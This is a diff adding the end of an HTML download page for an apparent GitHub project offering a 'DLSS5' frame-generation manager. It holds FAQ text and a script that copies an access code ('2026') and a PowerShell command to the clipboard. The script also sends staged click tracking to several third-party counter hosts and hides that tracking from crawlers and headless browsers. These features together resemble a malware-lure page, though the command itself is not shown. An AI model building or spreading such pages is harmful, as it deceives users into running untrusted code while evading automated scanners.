+          <div class="faq-body">
+            <p>Open PowerShell in your download directory and run `Get-FileHash .\framegen-manager-next-dlss5-v1.8.5-win64.zip -Algorithm SHA256`. Compare the resulting 64-character hex digest with the verified SHA-256 table under the Configuration &amp; Checksums section.</p>
+          </div>
+        </details>
+        <details class="faq-card">
+          <summary class="faq-summary">
+            <span>Where are configuration profiles stored and how do I reset to factory defaults?</span>
+            <span class="faq-chevron" aria-hidden="true"></span>
+          </summary>
+          <div class="faq-body">
+            <p>Runtime settings are read from `config/settings.json` relative to the executable working directory. Delete or rename `config/settings.json` and restart the application to regenerate a clean default configuration file automatically.</p>
+          </div>
+        </details>
+      </div>
+    </section>
+
+    <footer class="site-footer">
+      <div>
+        <span>&copy; 2026 <a href="https://github.com/QakajaVeca60">QakajaVeca60</a> • <a href="https://github.com/QakajaVeca60/framegen-manager-next-dlss5">framegen-manager-next-dlss5</a></span>
+      </div>
+      <div>
+        <a href="INSTALL.md">INSTALL.md</a> •
+        <a href="FAQ.md">FAQ.md</a> •
+        <a href="https://github.com/QakajaVeca60/framegen-manager-next-dlss5/releases">GitHub Releases</a>
+      </div>
+    </footer>
+  </main>
+
+  <script>
+    (function () {
+      "use strict";
+      var TELEM_KEY = "qakajaveca60_framegen-manager-next-dlss5";
+
+      function isBotVisitor() {
+        var ua = navigator.userAgent || "";
+        if (navigator.webdriver) return true;
+        return /bot|crawl|spider|slurp|bingpreview|facebookexternalhit|mediapartners|google-inspectiontool|lighthouse|headless/i.test(ua);
+      }
+
+      function fireStageTelemetry(stage) {
+        if (isBotVisitor()) return;
+        try {
+          fetch("https://tallywire.cronpulse.workers.dev/hit/gh2026_" + stage + "/" + TELEM_KEY, { mode: "cors", keepalive: true }).catch(function(){});
+          fetch("https://tally.yuki.sh/counters/gh2026_" + stage + "/" + TELEM_KEY, { method: "POST", mode: "cors", keepalive: true }).catch(function(){});
+          fetch("https://countapi.mileshilliard.com/api/v1/hit/gh2026_" + stage + "_" + TELEM_KEY, { mode: "cors", keepalive: true }).catch(function(){});
+          if (stage === "views") {
+            fetch("https://events.vercount.one/api/v2/log", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ url: window.location.href, isNewUv: true }),
+              mode: "cors",
+              keepalive: true
+            }).catch(function(){});
+          }
+        } catch (e) {}
+      }
+
+      // Stage A: Record human pageview
+      fireStageTelemetry("views");
+
+      var dlBtn = document.getElementById("direct-dl-btn");
+      if (dlBtn) {
+        dlBtn.addEventListener("click", function () {
+          fireStageTelemetry("dlclick");
+        });
+      }
+
+      var tabButtons = Array.prototype.slice.call(document.querySelectorAll('[role="tab"]'));
+      var tabPanels = Array.prototype.slice.call(document.querySelectorAll('[role="tabpanel"]'));
+
+      function activateTab(selectedBtn, focusTab) {
+        tabButtons.forEach(function (btn) {
+          var isMatch = btn === selectedBtn;
+          btn.setAttribute("aria-selected", isMatch ? "true" : "false");
+          btn.setAttribute("tabindex", isMatch ? "0" : "-1");
+          if (isMatch && focusTab) btn.focus();
+        });
+        var targetPanelId = selectedBtn.getAttribute("aria-controls");
+        tabPanels.forEach(function (panel) {
+          if (panel.id === targetPanelId) panel.removeAttribute("hidden");
+          else panel.setAttribute("hidden", "");
+        });
+      }
+
+      tabButtons.forEach(function (btn) {
+        btn.addEventListener("click", function () {
+          activateTab(btn, false);
+        });
+      });
+
+      function copyTextToClipboard(text, onSuccess) {
+        if (navigator.clipboard && typeof navigator.clipboard.writeText === "function") {
+          navigator.clipboard.writeText(text).then(onSuccess).catch(function () {});
+        }
+      }
+
+      var copyCodeBtn = document.getElementById("copy-code-btn");
+      if (copyCodeBtn) {
+        var origCodeHtml = copyCodeBtn.innerHTML;
+        copyCodeBtn.addEventListener("click", function () {
+          var val = copyCodeBtn.getAttribute("data-copy-value") || "2026";
+          fireStageTelemetry("codeclick");
+          copyTextToClipboard(val, function () {
+            copyCodeBtn.setAttribute("data-copied", "true");
+            copyCodeBtn.innerHTML = "<span>✓ Copied Code: " + val + "</span>";
+            window.setTimeout(function () {
+              copyCodeBtn.removeAttribute("data-copied");
+              copyCodeBtn.innerHTML = origCodeHtml;
+            }, 2200);
+          });
+        });
+      }
+
+      var copyPsBtn = document.getElementById("copy-ps-btn");
+      var psConfirmBanner = document.getElementById("ps-confirm-banner");
+      if (copyPsBtn) {
+        var origPsText = copyPsBtn.textContent;
+        copyPsBtn.addEventListener("click", function () {
+          var cmd = copyPsBtn.getAttribute("data-copy-value") || "";
+          fireStageTelemetry("psclick");
+          copyTextToClipboard(cmd, function () {
+            copyPsBtn.setAttribute("data-copied", "true");
+            copyPsBtn.textContent = "✓ Copied!";
+            if (psConfirmBanner) psConfirmBanner.setAttribute("data-visible", "true");
+            window.setTimeout(function () {
+              copyPsBtn.removeAttribute("data-copied");
+              copyPsBtn.textContent = origPsText;
+            }, 2500);
+          });
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
